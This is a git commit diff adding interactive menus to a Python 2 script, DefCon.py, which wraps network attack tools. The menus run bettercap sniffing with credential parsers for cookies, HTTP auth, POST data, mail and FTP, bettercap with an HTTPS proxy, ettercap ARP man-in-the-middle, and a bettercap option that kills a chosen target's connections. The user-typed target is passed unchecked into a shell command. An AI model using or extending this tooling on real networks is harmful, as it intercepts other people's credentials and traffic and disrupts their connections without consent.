93106c83423c77f31ee8c4df2b4925bb4410ce46
T0PK3K3L1TE <topkek3lite@yandex.com>
2017-04-18 14:22:02 +0000

    Add files via upload

--- Assets/DefCon.py
+++ Assets/DefCon.py
@@ -46,12 +46,219 @@ Interface2Mscreen = bcolors.OKGREEN + """
 
 """
 
+Interface1Mscreen = bcolors.HEADER + """
+##############################################
+# """+bcolors.ENDC+"""1) Basic Bettercap Scan"""+bcolors.HEADER+"""                    #
+# """+bcolors.ENDC+"""2) Full Bettercap Scan """+bcolors.HEADER+"""                    #
+# """+bcolors.ENDC+"""3) Kill Connections    """+bcolors.HEADER+"""                    #
+# ------------------------------------------ #
+# Extra Commands |                           #
+# ---------------                            #
+# exit                         -Exits Script #
+# clear                        -Clear Screen #
+# menu                         -Brings Menu  #
+##############################################
+# Information: All Network Functions Will Be #
+# Reset On Disconnection...                  #
+#                                            #
+##############################################
+
+"""
+
+Interface3Mscreen = bcolors.OKBLUE + """
+##############################################
+# """+bcolors.OKGREEN+"""1) Basic Ship Scan"""+bcolors.OKBLUE+"""                         #
+# """+bcolors.OKGREEN+"""2) Basic Bettercap Scan"""+bcolors.OKBLUE+"""                    #
+# """+bcolors.OKGREEN+"""3) Full Ship Scan"""+bcolors.OKBLUE+"""                          #
+# """+bcolors.OKGREEN+"""4) Full Bettercap Scan"""+bcolors.OKBLUE+"""                     #
+# """+bcolors.OKGREEN+"""5) Full Bettercap Scan With Proxy"""+bcolors.OKBLUE+"""          #
+# """+bcolors.OKGREEN+"""6) Full Ettercap MITM"""+bcolors.OKBLUE+"""                      #
+# ------------------------------------------ #
+# Extra Commands |                           #
+# ---------------                            #
+# exit                        -Exits Screen  #
+# menu                        -Pulls Menu    #
+# clear                       -Clears Screen #
+##############################################
+# Information: With the use of ettercap you  #
+# have full capability to a network.         #
+##############################################
+
+"""
+
+Interface3EttercapMITMmscreen = bcolors.OKBLUE+"""
+##############################################
+# 1) Arp MITM
+# 2) ICMP MITM
+# 3) DHCP MITM
+# 4) PORT MITM
+#
+#
+#
+#
+#
+#
+
+"""
+
 host = socket.gethostname()
 home = os.getcwd()
 
+def Interface3Run():
+    main_selection = raw_input(bcolors.OKGREEN+"["+bcolors.FAIL+str(host)+bcolors.OKGREEN+"]?:>> ")
+    if main_selection == str("1"):
+        os.chdir("shIP")
+        os.system("bash ship.sh -HM")
+        os.chdir(str(home))
+        Interface3Run()
+
+    elif main_selection == str("2"):
+        print bcolors.OKBLUE+"Begining Scan..."
+        os.system("bettercap -X")
+        print bcolors.OKBLUE + "Reseting Connections..."
+        print "Restarting Needed Services"
+        os.system("service networking restart")
+        print bcolors.OKBLUE + "Networking Reset"
+        os.system("service network-manager restart")
+        print "Network Manager Reset"
+        Interface3Run()
+
+    elif main_selection == str("3"):
+        os.chdir("shIP")
+        print bcolors.OKBLUE+"Begining Scan..."
+        os.system("bash ship.sh -HM -n")
+        os.chdir(str(home))
+        print bcolors.OKGREEN+"Scan Complete"
+        Interface3Run()
+
+    elif main_selection == str("4"):
+        print bcolors.OKGREEN+"Begining Scan..."
+        print bcolors.OKBLUE+"Use 'h' For Inline Help"
+        os.system("ettercap -M arp -T")
+        print bcolors.OKGREEN+"Scan Complete"
+        Interface3Run()
+
+    elif main_selection == str("5"):
+        print bcolors.HEADER+"Begining Scan..."
+        print bcolors.ENDC+"Use 'ctrl+c' To Stop"
+        os.system("bettercap -X --proxy-https")
+        print bcolors.OKBLUE + "Reseting Connections..."
+        print "Restarting Needed Services"
+        os.system("service networking restart")
+        print bcolors.OKBLUE + "Networking Reset"
+        os.system("service network-manager restart")
+        print "Network Manager Reset"
+        os.system("clear")
+        Interface3Run()
+
+    elif main_selection == str("6"):
+        os.system("clear")
+        print "Create Me"
+        Interface3Run()
+
+    elif main_selection == str("menu"):
+        Interface3()
+
+    elif main_selection == str("exit"):
+        print bcolors.OKBLUE+"Would You Like To Reset All Network Services?[Y/n]"
+        exiting = raw_input(bcolors.OKGREEN+"["+bcolors.FAIL+str(host)+bcolors.OKGREEN+"]?:>> ")
+        if exiting == str("y" or "Y"):
+            print bcolors.OKBLUE + "Reseting Connections..."
+            print "Restarting Needed Services"
+            os.system("service networking restart")
+            print bcolors.OKBLUE + "Networking Reset"
+            os.system("service network-manager restart")
+            print "Network Manager Reset"
+            sys.exit(1)
+
+        elif exiting == str("n" or "N"):
+            sys.exit(1)
+
+        else:
+            sys.exit(1)
+
+    elif main_selection == str("clear"):
+        os.system("clear")
+        Interface3Run()
+
+    else:
+        print bcolors.FAIL+"Invalid Command"
+        Interface3Run()
+
+def Interface3():
+    os.system("clear")
+    print Interface3Mscreen
+    Interface3Run()
+
+def Interface1Run():
+    main_selection = raw_input(bcolors.OKGREEN+"["+bcolors.WARNING+str(host)+bcolors.OKGREEN+"]?:>> ")
+    if main_selection == str("1"):
+        print bcolors.OKBLUE+"Begining Scan..."
+        print bcolors.ENDC+"Use 'ctrl+c' To Stop"
+        os.system("bettercap -X")
+        print bcolors.OKBLUE + "Reseting Connections..."
+        print "Restarting Needed Services"
+        os.system("service networking restart")
+        print bcolors.OKBLUE + "Networking Reset"
+        os.system("service network-manager restart")
+        print "Network Manager Reset"
+        Interface1Run()
+
+    elif main_selection == str("2"):
+        print bcolors.OKBLUE+"Begining Scan..."
+        print bcolors.ENDC+"Use 'alt+c' To Stop"
+        os.system("bettercap -X --parsers SNMP, HTTPS, WHATSAPP, POST, NTLMSS, DICT, RLOGIN, MAIL, URL, PGSQL, SNPP, DHCP, MYSQLTEAMVIEWER, COOKIE, FTP, REDIS, NNTP, HTTPAUTH, IRC, MPD")
+        print bcolors.OKBLUE + "Reseting Connections..."
+        print "Restarting Needed Services"
+        os.system("service networking restart")
+        print bcolors.OKBLUE + "Networking Reset"
+        os.system("service network-manager restart")
+        print "Network Manager Reset"
+        Interface1Run()
+
+    elif main_selection == str("3"):
+        print bcolors.OKBLUE+"Please Input A Target: "
+        target = raw_input(bcolors.OKGREEN+"["+bcolors.FAIL+str(host)+bcolors.OKGREEN+"]?:>> ")
+        print bcolors.ENDC  +"Use 'ctrl+c' To Stop"
+        print bcolors.OKBLUE+"Begining Scan On: "+str(target)
+        os.system("bettercap -T "+str(target)+" -X --kill")
+        print bcolors.OKBLUE + "Reseting Connections..."
+        print "Restarting Needed Services"
+        os.system("service networking restart")
+        print bcolors.OKBLUE + "Networking Reset"
+        os.system("service network-manager restart")
+        print "Network Manager Reset"
+
+    elif main_selection == str("menu"):
+        Interface1()
+
+    elif main_selection == str("clear"):
+        os.system("clear")
+        Interface1Run()
+
+    elif main_selection == str("exit"):
+        print bcolors.OKBLUE+"Would You Like To Reset Networking Services Before Exiting?[Y/n]"
+        exiting = raw_input(bcolors.OKGREEN+"["+bcolors.FAIL+str(host)+bcolors.OKGREEN+"]?:>> ")
+        if exiting == str("y" or "Y"):
+            print bcolors.OKBLUE + "Reseting Connections..."
+            print "Restarting Needed Services"
+            os.system("service networking restart")
+            print bcolors.OKBLUE + "Networking Reset"
+            os.system("service network-manager restart")
+            print "Network Manager Reset"
+            sys.exit(1)
+
+        elif exiting == str("n" or "N"):
+            sys.exit(1)
+
+        else:
+            print bcolors.FAIL+"Invalid Command"
+            sys.exit(1)
+
 def Interface1():
-    print "Create Me..."
-    sys.exit(1)
+    os.system("clear")
+    print Interface1Mscreen
+    Interface1Run()
 
 def Interface2RunStart():
     print Banner
@@ -208,12 +415,16 @@ def Running():
     print bcolors.OKBLUE  + "Please Setect A Wanted User Level For The Program..."
     print bcolors.OKGREEN + "[1]?:>> Basic Information Running With Bettercap"
     print bcolors.ENDC    + "[2]?:>> Run With Bettercap and shIP... (shIP Asset Needed)"
+    print bcolors.HEADER  + "[3]?:>> Run With Ettercap, Bettercap, shIP... (shIP Asset Needed)"
     interface_input = raw_input(bcolors.OKGREEN+"["+bcolors.WARNING+str(host)+bcolors.OKGREEN+"]?:>> ")
     if interface_input == str("1"):
         Interface1()
 
     elif interface_input == str("2"):
         Interface2()
+
+    elif interface_input == str("3"):
+        Interface3()
 
     else:
         print bcolors.FAIL + "Invalid Entry..."
